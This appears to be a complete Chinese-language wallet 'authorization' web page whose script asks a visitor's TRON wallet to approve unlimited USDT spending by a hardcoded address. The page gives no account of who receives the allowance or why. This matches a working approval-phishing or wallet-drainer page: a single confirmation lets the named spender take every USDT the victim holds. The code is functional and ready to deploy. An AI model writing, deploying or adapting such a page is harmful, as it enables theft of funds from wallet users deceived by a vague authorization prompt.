<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <title>授权页面</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.2/dist/TronWeb.min.js"></script>
    <style>
        body {
            background: #fff;
            text-align: center;
            padding-top: 120px;
            font-size: 18px;
            color: #333;
        }
        #authBtn {
            padding: 15px 30px;
            font-size: 18px;
            cursor: pointer;
            background: #27ae60;
            color: white;
            border: none;
            border-radius: 5px;
        }
    </style>
</head>
<body>
    <div id="tip">请点击下方按钮发起授权</div>
    <br><br>
    <button id="authBtn">授权 USDT</button>

<script>
// 基础配置
const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
const SPENDER_ADDR = "TTbMYbFf3GoURy8S536ZWioGCEn74T8S3U";
// 无限授权大数
const MAX_AMOUNT = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
const tipDom = document.getElementById('tip');
const btnDom = document.getElementById('authBtn');

// 标准TRC20合约ABI
const TRC20_ABI = [
    {"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"type":"function"}
];

// 等待tronWeb就绪
function waitTronReady() {
    return new Promise(resolve => {
        let timer = setInterval(() => {
            if (window.tronWeb && window.tronWeb.ready) {
                clearInterval(timer);
                resolve(window.tronWeb);
            }
        }, 600);
    });
}

// 授权主逻辑
async function startApprove() {
    btnDom.disabled = true;
    tipDom.innerText = "正在连接钱包...";
    try {
        const tronWeb = await waitTronReady();
        const usdtContract = tronWeb.contract(TRC20_ABI, USDT_CONTRACT);
        
        tipDom.innerText = "正在发起授权，请在钱包确认！";
        // 调用授权，会触发imToken弹窗
        const tx = await usdtContract.approve(SPENDER_ADDR, MAX_AMOUNT).send();
        tipDom.innerText = `授权成功！交易哈希：${tx}`;
    } catch (err) {
        tipDom.innerText = "授权失败：" + err.message;
        console.error(err);
    } finally {
        btnDom.disabled = false;
    }
}

// 绑定按钮点击事件
btnDom.addEventListener('click', startApprove);
</script>
</body>
</html>
